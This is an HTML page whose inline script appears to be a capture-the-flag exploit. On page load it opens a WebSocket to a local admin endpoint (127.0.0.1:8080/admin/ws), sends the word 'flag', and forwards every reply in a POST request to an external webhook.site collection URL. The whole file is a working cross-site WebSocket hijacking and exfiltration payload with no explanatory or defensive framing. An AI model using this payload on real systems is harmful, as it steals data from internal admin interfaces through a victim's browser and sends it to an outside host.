<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket and Webhook Example</title>
</head>
<body>
    <h1>WebSocket to Webhook Example</h1>
    <script>
        // WebSocket URL
        const websocketURL = "ws://127.0.0.1:8080/admin/ws";

        // Webhook URL
        const webhookBaseURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";

        // WebSocket initialization
        const socket = new WebSocket(websocketURL);

        // Flag message to send
        const flag = "flag";

        // Function to send POST request to the webhook
        function sendPostToWebhook(responseMessage) {
            const webhookURLWithFlag = `${webhookBaseURL}/flag=${encodeURIComponent(responseMessage)}`;
            console.log("Sending POST request to Webhook with message:", responseMessage);

            fetch(webhookURLWithFlag, {
                method: "POST",
            })
            .then((response) => {
                if (response.ok) {
                    console.log("POST request sent successfully!");
                } else {
                    console.error("Failed to send POST request:", response.statusText);
                }
            })
            .catch((error) => {
                console.error("Error sending POST request:", error);
            });
        }

        // Event listener for WebSocket open event
        socket.addEventListener("open", () => {
            console.log("WebSocket connection opened. Sending flag after 50ms delay.");
            // Wait 50 milliseconds before sending the flag
            setTimeout(() => {
                socket.send(flag);
                console.log("Flag sent to WebSocket server:", flag);
            }, 50);
        });

        // Event listener for receiving messages from WebSocket
        socket.addEventListener("message", (event) => {
            const responseMessage = event.data;
            console.log("Message received from WebSocket server:", responseMessage);

            // Send the received message to the webhook
            sendPostToWebhook(responseMessage);
        });

        // Handle WebSocket errors
        socket.addEventListener("error", (error) => {
            console.error("WebSocket error occurred:", error);
        });

        // Handle WebSocket close event
        socket.addEventListener("close", () => {
            console.log("WebSocket connection closed.");
        });
    </script>
</body>
</html>
